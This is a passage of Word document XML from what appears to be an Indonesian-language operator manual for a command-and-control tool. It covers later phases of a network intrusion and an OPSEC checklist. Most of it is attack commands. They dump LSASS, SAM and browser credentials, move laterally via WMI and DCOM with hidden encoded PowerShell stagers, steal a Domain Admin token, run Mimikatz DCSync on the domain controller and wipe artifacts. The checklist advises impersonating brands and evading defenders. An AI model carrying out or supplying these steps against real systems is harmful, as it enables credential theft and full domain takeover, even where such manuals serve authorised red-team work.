    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download AGENTID "C:\Temp\ls.dmp" ./loot/lsass.dmp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Dump SAM database.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds sam AGENTID --output-dir "C:\Temp" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download AGENTID "C:\Temp\SAM"    ./loot/SAM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download AGENTID "C:\Temp\SYSTEM" ./loot/SYSTEM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Dump browser credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds browser AGENTID --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Parse credentials (di mesin operator).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>pypykatz lsa minidump ./loot/lsass.dmp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Hasil: CORP\john.doe:CorpMail@2026!, CORP\administrator:Admin@Corp!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Phase 5 — Lateral Movement ke File Server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Lateral ke FS01 via WMI menggunakan credential administrator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral wmi AGENTID 192.168.1.50 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "powershell -w hidden -enc &lt;B64_STAGER&gt;" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --user administrator --domain CORP --pass 'Admin@Corp!' --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Tunggu agent baru dari FS01.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># FS01_AGENTID   FS01   CORP\administrator   online</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Dump credential dari FS01 (mungkin ada lebih banyak DA session).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds lsass FS01_AGENTID --output "C:\Temp\ls2.dmp" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Phase 6 — Domain Compromise via DCOM ke DC01</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Steal token Domain Admin dari FS01.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token list FS01_AGENTID --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Cari session DA di FS01</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token steal FS01_AGENTID --pid &lt;DA_PID&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Lateral ke DC01 via DCOM (paling stealth — tidak ada service/schtask).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral dcom FS01_AGENTID DC01 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "powershell -w hidden -enc &lt;B64_STAGER&gt;" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --method mmc20 --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Tunggu agent dari DC01.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># DC01_AGENTID   DC01   CORP\administrator   online   ← DA!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>DCSync via Mimikatz untuk dump semua credential domain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files upload DC01_AGENTID ./mimikatz.exe "C:\Windows\Temp\m.exe" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd DC01_AGENTID \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "C:\Windows\Temp\m.exe \"lsadump::dcsync /domain:CORP.LOCAL /all\" exit" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --timeout 120 --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Cleanup — hapus semua artefak.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd DC01_AGENTID "del C:\Windows\Temp\m.exe" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd DC01_AGENTID "del C:\Temp\*.dmp" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence remove AGENTID --method registry_run --name "WindowsUpdate" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 20 — OPSEC CHECKLIST &amp; BEST PRACTICES</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>OPSEC (Operations Security) adalah serangkaian praktik untuk meminimalkan jejak digital yang ditinggalkan selama engagement. Gagal OPSEC bisa berarti deteksi prematur, alert incident response, dan kegagalan engagement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Pre-Engagement Checklist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Gunakan VPS dedicated untuk C2, bukan IP pribadi atau perusahaan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Aktifkan TLS dengan sertifikat valid (Let's Encrypt) — sertifikat self-signed mudah dideteksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Daftarkan domain yang terlihat legitimate (brand impersonation sesuai target).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Gunakan malleable profile yang sesuai target environment (office365 untuk korporat).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Set KILL_DATE agar agent otomatis mati setelah engagement selesai.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Catat semua persistence, artefak, dan akun yang dibuat untuk cleanup.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Aktifkan API key authentication di server.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Gunakan cert pinning di agent untuk mencegah MITM oleh blue team.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Operational Checklist</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4537"/>
        <w:gridCol w:w="4537"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Fase</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Checklist Item</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Initial Access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Hapus stager dari server setelah agent check-in</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Initial Access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Verifikasi tidak ada error di log server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Post-Exploit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
